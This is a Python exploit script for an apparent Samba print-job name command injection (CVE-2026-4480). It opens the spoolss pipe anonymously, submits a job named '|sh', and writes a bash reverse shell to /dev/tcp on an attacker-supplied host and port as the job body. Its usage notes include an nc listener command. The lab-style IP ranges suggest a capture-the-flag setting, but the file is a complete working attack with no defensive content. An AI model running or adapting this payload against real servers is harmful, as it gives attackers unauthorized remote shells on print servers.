#!/usr/bin/env python3
"""CVE-2026-4480 — Samba print-job name (%J) command injection via spoolss.

The job name is substituted into `print command` unquoted. RAP clients
(smbclient print) sanitize metacharacters; this talks spoolss directly.

Requires: python3-samba (Kali: apt install python3-samba)

Usage:
  python3 cve_2026_4480_spoolss.py --rhost 10.129.x.x --lhost 10.10.x.x --lport 4444
  # listener: nc -lvnp 4444
"""
from __future__ import annotations

import argparse

from samba.credentials import Credentials
from samba.dcerpc import spoolss
from samba.param import LoadParm


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--rhost", required=True)
    ap.add_argument("--lhost", required=True)
    ap.add_argument("--lport", type=int, default=4444)
    ap.add_argument("--printer", default="HP-Reception")
    args = ap.parse_args()

    data = (
        "setsid bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &\n"
        % (args.lhost, args.lport)
    ).encode()

    lp = LoadParm()
    lp.load_default()
    creds = Credentials()
    creds.guess(lp)
    creds.set_anonymous()
    iface = spoolss.spoolss(rf"ncacn_np:{args.rhost}[\pipe\spoolss]", lp, creds)

    handle = iface.OpenPrinter(
        rf"\\{args.rhost}\{args.printer}",
        "",
        spoolss.DevmodeContainer(),
        0x00000008,  # PRINTER_ACCESS_USE
    )
    info = spoolss.DocumentInfo1()
    info.document_name = "|sh"
    info.output_file = None
    info.datatype = "RAW"
    ctr = spoolss.DocumentInfoCtr()
    ctr.level = 1
    ctr.info = info

    iface.StartDocPrinter(handle, ctr)
    iface.StartPagePrinter(handle)
    iface.WritePrinter(handle, data, len(data))
    iface.EndPagePrinter(handle)
    iface.EndDocPrinter(handle)
    iface.ClosePrinter(handle)
    print("[+] job submitted (print command should run |sh on spool body)")


if __name__ == "__main__":
    main()
